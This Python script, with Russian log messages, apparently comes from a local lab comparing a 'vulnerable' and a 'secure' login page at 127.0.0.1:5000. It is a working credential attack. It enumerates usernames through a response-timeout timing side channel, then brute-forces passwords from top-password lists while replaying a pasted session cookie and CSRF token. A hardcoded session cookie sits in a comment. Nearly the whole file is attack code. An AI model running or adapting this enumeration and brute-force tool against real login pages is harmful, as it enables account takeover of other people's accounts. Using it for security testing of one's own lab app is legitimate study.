from loguru import logger
import requests
from requests import ReadTimeout
from simple_term_menu import TerminalMenu

from utils.data import top_usernames, top_passwords
from tqdm import tqdm

URL = 'http://127.0.0.1:5000/login'
URL_SEC = 'http://127.0.0.1:5000/login_sec'
# Cookie = 'session=.eJxlUNEOgjAM_BXSZ2K6dgTGZ_iqxky2qVHBAD4R_l3oMJCYLLe2d71cOsA5PG138x2UhwGSfvrA2frqW0jh-EGtwozsBS8z6krqfDMnQRQ21tlGHxJpXCSk0UqQBc26scxpdY2ahaXoVKzmXMRR2CTA_8T_CXiTc9kQWkdbA6cx_R3kXodmOsfed--mrnzS31--TLDE-e0QFRNP-lMKVdeGc988fA0lGLbkyVoXcqsR9QWLnMhwRplVuXPGFMSaFYxfRWVtyw.Y_N7hw.K0074WI7T3g9IhDqWNEOvqGCEQ0; HttpOnly; Path=/'
# # Cookie = input('Вставьте куки из POST запроса, чтобы обойти csrf')
# # token = input('Вставьте csrf-token из POST запроса, чтобы обойти csrf')



def check_users(url, usernames, token, headers):
    logger.info(f'Загрузил словарь с популярными username ({len(usernames)} записей)')
    logger.info('Начинаю проверку...')
    users = []
    with tqdm(total=len(usernames)) as pbar:
        for username in usernames:
            try:
                responce = requests.post(url, headers=headers, timeout=0.5,
                                         data={
                                             'csrf_token': token,
                                             'username': username,
                                             'password': 'testhjkl;fgbnhmjhjkl;',
                                             'Login': 'Login'})

                pbar.update(1)

                # logger.debug(f'time: {responce.elapsed.total_seconds()} | code: {responce.status_code} | username: {username} |')
            except ReadTimeout:
                # logger.info(f'Существует пользователь {username}')
                pbar.update(1)
                users.append(username)
    logger.info(f'Найдено {len(users)} логинов')
    return users

def create_dict(users, top_passwords):
    logger.debug(f'Составляю список для атаки..')
    username_list = []
    password_list = []
    brut_list = {}
    for user in users:
        for password in top_passwords:
            username_list.append(user)
            password_list.append(password)

    brut_list['usernames']= username_list
    brut_list['passwords']= password_list
    logger.debug(f'Подготовил {len(username_list)} записей для атаки')

    return brut_list


def bruteforce(brut_dict, token, headers):
    usernames = brut_dict.get('usernames')
    passwords = brut_dict.get('passwords')
    users = []
    with tqdm(total=len(usernames)) as pbar:
        for username, password in zip(usernames, passwords):
            responce = requests.post(URL, headers=headers,
                                         data={
                                             'csrf_token': token,
                                             'username': username,
                                             'password': password,
                                             'Login': 'Login'})

            pbar.update(1)
            if 'Login' in responce.text:
                pass
            if '404' in responce.text:
                pass
            else:
                users.append(f'login: {username} | password: {password}')
                # logger.info(f'Получил пользователя! | login: {username} | password: {password}')
    return users



def start(url, token, headers):
    users = check_users(url=url, usernames=top_usernames, token=token, headers=headers)
    if len(users) == 0:
        logger.info(f'Не удалость эксплуатировать уязвимость | Пользователи не найдены')
        logger.info(f'Прекратил выполнение.')
    else:
        brut_dict = create_dict(users=users, top_passwords=top_passwords)
        creds = bruteforce(brut_dict, token=token, headers=headers)
        logger.debug(f'Получил {len(creds)} аккаунтов')
        for i in creds:
            print(i)


def create_cookie():
    Cookie = input('Вставте куки из POST запроса, чтобы обойти csrf:')
    token = input('Вставте csrf-token из POST запроса, чтобы обойти csrf:')

    cookies = {'HEADER':{
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Cookie': Cookie,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'},
    'csrf_token': token}

    return cookies



def main():

    print(f'Начать проверку (введите цифру):\n\n'
          f'1) Уязвимого приложения\n'
          f'2) Безопастного приложения\n\n'
          f'ВНИМАНИЕ! Для работоспособности Необходимо обновить куки и csrf токен в заголовках')

    choice = input()
    if choice == '1':
        cookie = create_cookie()
        start(url=URL, token=cookie.get('csrf_token'), headers=cookie.get('HEADER'))
    elif choice == '2':
        cookie = create_cookie()
        start(url=URL_SEC, token=cookie.get('csrf_token'), headers=cookie.get('HEADER'))
    else:
        print('Не верно указан номер, прекратил выполнение приложения..')



if __name__ == '__main__':
    main()



# def txt_to_list():
#     path = input('Укажите путь до txt файла:')
#     with open(f"{path}", "r") as file1:
#         usernames = []
#         for line in file1:
#             usernames.append(line.strip())
#     return usernames
